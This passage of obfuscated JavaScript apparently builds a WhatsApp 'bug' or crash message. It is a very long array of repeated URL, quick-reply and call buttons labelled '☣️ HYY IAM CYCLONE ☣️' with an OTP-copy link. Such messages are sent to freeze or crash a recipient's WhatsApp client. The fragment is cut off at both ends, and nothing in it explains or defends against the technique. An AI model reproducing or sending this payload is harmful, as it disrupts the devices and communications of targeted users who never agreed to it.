b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0